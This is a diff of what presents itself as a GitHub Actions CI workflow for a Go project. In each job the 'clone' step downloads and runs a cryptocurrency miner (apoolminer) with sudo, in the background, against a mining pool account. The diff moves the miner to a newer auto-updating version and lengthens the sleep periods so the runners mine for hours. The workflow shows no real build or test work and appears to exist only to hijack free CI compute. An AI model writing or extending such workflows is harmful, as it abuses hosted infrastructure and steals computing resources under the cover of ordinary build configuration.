@@ -4,7 +4,7 @@ on:
     branches: [ "main" ]
 
 jobs:
-  gelas:
+  Motekar:
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 80
@@ -25,10 +25,12 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-takezo) --pool qubic1.hk.apool.io:2334 --thread 4 &
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.2.2/apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.2.2 && sudo ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-Takezo) --pool qubic.asia.apool.io:4334 --thread 4 &
            sleep 310s
+           
+           
   hamdun1:
-    needs: gelas
+    needs: Motekar
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -48,13 +50,12 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-takamura) --pool qubic1.hk.apool.io:2334 --thread 4 &
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.2.2/apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.2.2 && sudo ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-Takamura2) --pool qubic.asia.apool.io:4334 --thread 4 &
             sleep 5m
         
     
-     
   viniyi2:
-    needs: [gelas]
+    needs: [Motekar]
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -74,8 +75,10 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-akashi) --pool qubic1.hk.apool.io:2334 --thread 4 &
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.2.2/apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.2.2 && sudo ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-Musashi3) --pool qubic.asia.apool.io:4334 --thread 4 &
             sleep 6m
+            
+            
   ulyn3:
     needs: hamdun1
     runs-on: ubuntu-latest
@@ -97,11 +100,10 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-seijuro) --pool qubic1.hk.apool.io:2334 --thread 4 &
-            sleep 61m
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.2.2/apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.2.2 && sudo ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-Seijuro4) --pool qubic.asia.apool.io:4334 --thread 4 &
+            sleep 271m
         
     
-     
   ifu4:
     needs: [viniyi2]
     runs-on: ubuntu-latest
@@ -123,8 +125,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-rakuten) --pool qubic1.hk.apool.io:2334 --thread 4 &
-            sleep 90m
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.2.2/apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.2.2.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.2.2 && sudo ./apoolminer --gpu-off --account CP_6otjk8h431 --worker $(echo $(shuf -i 1-15000 -n 1)-Giyu5) --pool qubic.asia.apool.io:4334 --thread 4 &
+            sleep 273m
         
     
   
